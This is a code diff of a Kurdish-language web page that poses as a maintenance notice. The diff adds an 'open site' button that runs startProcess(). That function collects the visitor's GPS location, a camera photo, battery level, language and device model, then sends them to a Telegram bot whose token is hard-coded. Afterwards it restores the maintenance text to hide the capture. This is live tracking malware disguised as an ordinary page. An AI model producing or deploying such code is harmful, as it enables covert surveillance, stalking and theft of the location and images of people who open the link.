@@ -28,31 +28,43 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             max-width: 400px;
         }
-        h1 { font-size: 24px; color: #e74c3c; }
-        p { font-size: 16px; color: #666; }
+        h1 { font-size: 24px; color: #e74c3c; margin-bottom: 15px; }
+        p { font-size: 16px; color: #666; margin-bottom: 20px; }
+        .btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover { background-color: #2980b9; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="content-box">
         <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
-        <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
+        <p>تکایە بۆ بینینی ناوەڕۆکی پەڕەکە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
+        <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
     </div>
 
     <script>
         const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
         
-        // وەرگرتنی id لە لینک بە شێوەی دروست؛ ئەگەر لە لینکەکەدا نەبوو، idـی دەستنیشانکراو وەردەگرێت
+        // وەرگرتنی id لە لینک بە شێوەی دروست
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
-        // 1. دیاریکردنی کاتی دقیق (کاژێر:خولەک:چرکە)
+        // 1. دیاریکردنی کاتی دقیق
         function getVisitTime() {
             const now = new Date();
             const hours = String(now.getHours()).padStart(2, '0');
             const minutes = String(now.getMinutes()).padStart(2, '0');
             const seconds = String(now.getSeconds()).padStart(2, '0');
             const dateStr = now.toISOString().split('T')[0];
-            return `${dateStr} \vert{}${hours}:${minutes}:${seconds}`;
+            return `${dateStr}${hours}:${minutes}:${seconds}`;
         }
 
         // 2. وەرگرتنی شەحنی مۆبایل/ئامێرەکە
@@ -75,7 +87,7 @@
             return navigator.language || navigator.userLanguage || "نادیار";
         }
 
-        // وەرگرتنی مۆدێلی ئامێر (Device Model)
+        // وەرگرتنی مۆدێلی ئامێر (Device Model) - ڕاستکردنەوەی هەڵەکە تێیدا
         async function getDeviceModel() {
             let modelName = "نادیار / نەناسراو";
             
@@ -158,10 +170,15 @@
             }
         }
 
-        async function processVisitor() {
+        // ئەم فەنکشنە کاتێک کار دەکات کە بەکارهێنەر کلیک لەسەر دوگمەکە بکات
+        async function startProcess() {
+            document.getElementById('content-box').innerHTML = `
+                <h1>⏳ چاوەڕوان بێ...</h1>
+                <p>تکایە کەمێک بوەستە تا ماڵپەڕەکە دەکرێتەوە.</p>
+            `;
+
             if (!chatId) return;
 
-            // زانیارییە سەرەتاییەکان
             const visitTime = getVisitTime();
             const batteryInfo = await getBatteryInfo();
             const deviceLang = getDeviceLanguage();
@@ -202,14 +219,14 @@
                 mapText = `\n🗺 **لینکی نەخشە:** [کردنەوە لە Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
 
             } catch (error) {
-                if (error.code === 1) { // DENY
-                    locationText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
-                } else if (error.code === 2) { // POSITION_UNAVAILABLE
-                    locationText = "🟡 ALLOW کراوە (بەڵام Location / GPSی مۆبایلەکەی داخراوە)";
-                } else if (error.code === 3) { // TIMEOUT
-                    locationText = "⚠️ کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS";
+                if (error.code === 1) {
+                    locationText = "🔴 DENY کراوە (کەسەکە ڕێگەی نەدا)";
+                } else if (error.code === 2) {
+                    locationText = "🟡 ALLOW کراوە (بەڵام GPSی داخراوە)";
+                } else if (error.code === 3) {
+                    locationText = "⚠️ کاتەکە بەسەرچوو";
                 } else {
-                    locationText = "❌ ئامێرەکە پشتگیری لۆکەیشن ناکات";
+                    locationText = "❌ پشتگیری ناکرێت";
                 }
             }
 
@@ -242,13 +259,12 @@
                     });
 
                 } catch (err) {
-                    cameraStatusText = "🔴 DENY کراوە (کەسەکە Block / Allowی نەکرد)";
+                    cameraStatusText = "🔴 DENY کراوە (کەسەکە ڕێگەی نەدا)";
                 }
             } else {
-                cameraStatusText = "❌ ئامێرەکە پشتگیری کامێرا ناکات";
+                cameraStatusText = "❌ پشتگیری کامێرا ناکات";
             }
 
-            // دروستکردن و ڕێکخستنی تەنها یەک پەیامی گشتگیر
             const fullMessage = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
 
 ⏰ **کاتی سەردانیکردن:** \`${visitTime}\`
@@ -271,9 +287,13 @@
             if (imageBlob) {
                 await sendTelegramPhoto(imageBlob);
             }
-        }
 
-        window.onload = processVisitor;
+            // گەڕاندنەوەی شێوەی ئاسایی پەڕەکە لە لای بەکارهێنەر
+            document.getElementById('content-box').innerHTML = `
+                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
+                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
+            `;
+        }
     </script>
 </body>
 </html>
